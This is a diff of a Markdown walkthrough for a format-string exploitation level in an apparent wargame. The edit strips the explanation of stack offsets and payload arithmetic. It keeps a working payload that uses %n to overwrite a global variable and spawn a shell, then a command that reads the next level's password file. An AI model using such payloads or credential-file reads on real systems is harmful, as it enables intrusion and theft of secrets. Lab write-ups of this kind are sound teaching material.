@@ -204,55 +204,13 @@ Result: system("/bin/sh") executes! 🎉
 
 Unlike buffer overflows that **redirect execution**, format string attacks allow **arbitrary memory writes**. We write the value `64` directly to the global variable `m`, triggering the condition that spawns a shell.
 
-## 💣 Exploit Strategy
+## 💣 Execute the Exploit
 
-### Step 1: Find Stack Position 🔎
-```bash
-python -c 'print "AAAA" + "%x."*10' | ./level3
-```
-
-**Output**:
-```
-AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825.78252e78...
-                            ^^^^^^^^
-                         Position 4!
-```
-
-### Step 2: Understand Format String Primitives
-
-| Specifier | Description |
-|-----------|-------------|
-| `%x` | Print hexadecimal from stack |
-| `%p` | Print pointer from stack |
-| `%s` | Print string from pointer on stack |
-| `%n` | **Write** number of bytes printed to address on stack |
-| `%4$n` | Write to 4th argument (direct parameter access) |
-
-### Step 3: Calculate Payload 🧮
-
-```
-[Address: 4 bytes] + [Padding: 60 bytes] = 64 bytes total (0x40)
-      ↓                    ↓                      ↓
- 0x0804988c           %60x                    %4$n
-```
-
-**Breakdown**:
-- `\x8c\x98\x04\x08` → Address of `m` (little-endian)
-- `%60x` → Print 60 hex characters (padding)
-- `%4$n` → Write byte count (64) to 4th stack position
-
-### Step 4: Execute Exploit 💥
 ```bash
 (python -c 'print "\x8c\x98\x04\x08" + "%60x%4$n"'; cat) | ./level3
 ```
 
-**What Happens**:
-1. Address of `m` is placed at stack position 4
-2. `%60x` prints 60 characters → total bytes = 4 + 60 = 64
-3. `%4$n` writes 64 to the address at position 4 (which is `m`)
-4. `m == 0x40` condition is true → shell spawns! 🎉
-
-### Step 5: Get the Flag 🚩
+Get the flag:
 ```bash
 cat /home/user/level4/.pass
 ```
